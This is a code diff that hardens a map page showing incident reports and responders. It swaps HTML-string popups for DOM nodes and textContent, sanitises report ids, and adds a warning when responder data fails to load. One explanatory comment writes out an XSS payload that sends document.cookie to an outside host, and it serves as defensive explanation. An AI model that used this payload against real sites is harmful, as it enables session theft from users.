@@ -36,6 +36,30 @@ let low=0;
 
 const markers=[];
 
+// Report pins. A subject is whatever the person who filed it typed, so this
+// is built out of text nodes for the same reason the responder popup below
+// is — see the long comment there. Every pin on this map has one of these,
+// which makes it the widest version of that hole rather than the narrowest.
+function reportPopup(report){
+
+    const box=document.createElement("div");
+
+    const title=document.createElement("strong");
+    title.textContent=report.subject;
+
+    const priority=document.createElement("div");
+    priority.textContent=report.priority;
+
+    const link=document.createElement("a");
+    // Number() rather than the raw value: this is the one field that ends up
+    // in a URL, and an id of "javascript:..." should not survive the trip.
+    link.setAttribute("href","/report/"+Number(report.id));
+    link.textContent="Open Report";
+
+    box.append(title,document.createElement("br"),priority,link);
+    return box;
+}
+
 reports.forEach(report=>{
 
     if(report.priority==="HIGH") high++;
@@ -44,13 +68,7 @@ reports.forEach(report=>{
 
     const marker=L.marker([report.latitude,report.longitude])
     .addTo(map)
-    .bindPopup(`
-        <b>${report.subject}</b><br>
-        ${report.priority}<br>
-        <a href="/report/${report.id}">
-            Open Report
-        </a>
-    `);
+    .bindPopup(reportPopup(report));
 
     marker.subject=report.subject.toLowerCase();
 
@@ -160,6 +178,46 @@ function formatState(state){
 
 }
 
+// Built out of DOM nodes rather than an HTML string, deliberately.
+//
+// A report subject is free text typed by whoever filed the report, and it
+// reaches this line exactly as they typed it. Dropped into innerHTML, a
+// subject of
+//
+//     <img src=x onerror="fetch('https://elsewhere/'+document.cookie)">
+//
+// runs in the browser of every coordinator who opens this pin — and the
+// people opening these pins are the ones with the session worth stealing.
+//
+// Usernames happen to be safe today: signup restricts them to
+// [A-Za-z0-9._-]. But a line is not secure because of a rule enforced four
+// hundred lines away in another file, and that rule only has to be relaxed
+// once. textContent cannot be talked into executing anything, so it does
+// all of the work here.
+function responderPopup(responder) {
+
+    const box = document.createElement("div");
+
+    const name = document.createElement("strong");
+    name.textContent = responder.username;
+    box.append(name, document.createElement("br"));
+
+    // The template literals below are safe because the result becomes a
+    // text node. It is never parsed as markup.
+    const add = (text) => box.append(document.createTextNode(text),
+                                     document.createElement("br"));
+
+    add(`Status: ${formatState(responder.state)}`);
+
+    add(responder.assignment
+        ? `Assignment: ${responder.assignment.report_subject}`
+        : "Available");
+
+    add(`Last check-in: ${new Date(responder.last_position.at).toLocaleString()}`);
+
+    return box;
+}
+
 fetch("/api/responders")
     .then(res => res.json())
     .then(responders => {
@@ -178,19 +236,21 @@ fetch("/api/responders")
                 weight: 2
             }).addTo(map);
 
-            marker.bindPopup(`
-                <strong>${responder.username}</strong><br>
-
-                Status: ${formatState(responder.state)}<br>
-
-                ${responder.assignment
-                    ? `Assignment: ${responder.assignment.report_subject}<br>`
-                    : "Available<br>"}
-
-                Last Check-in:
-                ${new Date(responder.last_position.at).toLocaleString()}
-            `);
+            marker.bindPopup(responderPopup(responder));
 
         });
 
+    })
+    // The reports on this map came from the server with the page. The
+    // responder pins are a second request, and it is the one that fails
+    // when the network is bad — which is when somebody is most likely to
+    // be staring at this screen. Failing quietly leaves a map that looks
+    // complete and is missing every responder on it, so say so.
+    .catch(() => {
+        const warning = document.createElement("div");
+        warning.className = "map-warning";
+        warning.setAttribute("role", "status");
+        warning.textContent =
+            "Could not load responder positions. Reports are still shown.";
+        document.body.appendChild(warning);
     });
